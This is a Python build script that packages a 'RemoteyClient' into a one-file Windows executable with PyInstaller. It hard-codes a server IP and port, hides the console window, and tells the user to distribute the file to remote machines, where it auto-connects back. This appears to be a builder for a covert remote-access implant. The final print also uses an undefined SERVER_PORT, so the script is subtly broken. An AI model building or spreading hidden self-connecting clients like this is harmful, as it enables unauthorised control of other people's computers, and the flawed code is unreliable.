#!/usr/bin/env python3
"""
Build script to create standalone Windows executable
Usage: python build_client.py <server_ip>
"""
import sys
import os

def create_executable(server_ip):
    """Create standalone executable with PyInstaller"""

    # Create a wrapper script with embedded server IP
    wrapper_content = f"""#!/usr/bin/env python3
import sys
import os

# Embedded server configuration
SERVER_HOST = '{server_ip}'
SERVER_PORT = 8888

# Add the client code inline
{open('client.py', 'r').read().replace('if __name__', 'if False')}

if __name__ == '__main__':
    client = RemoteyClient(SERVER_HOST, SERVER_PORT)
    client.run()
"""

    with open('client_standalone.py', 'w') as f:
        f.write(wrapper_content)

    print(f"[*] Building executable for server: {server_ip}")
    print("[*] Running PyInstaller...")

    # Build with PyInstaller
    os.system('pyinstaller --onefile --noconsole --name remotey_client client_standalone.py')

    print("\n[+] Build complete!")
    print(f"[+] Executable: dist/remotey_client.exe")
    print(f"\n[*] Distribute this file to remote Windows machines")
    print(f"[*] When executed, it will auto-connect to {server_ip}:{SERVER_PORT}")

    # Cleanup
    os.remove('client_standalone.py')

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python build_client.py <server_ip>")
        print("Example: python build_client.py 192.168.1.100")
        sys.exit(1)

    server_ip = sys.argv[1]

    # Check if PyInstaller is available
    try:
        import PyInstaller
    except ImportError:
        print("[-] PyInstaller not found. Installing...")
        os.system('pip install pyinstaller')

    create_executable(server_ip)
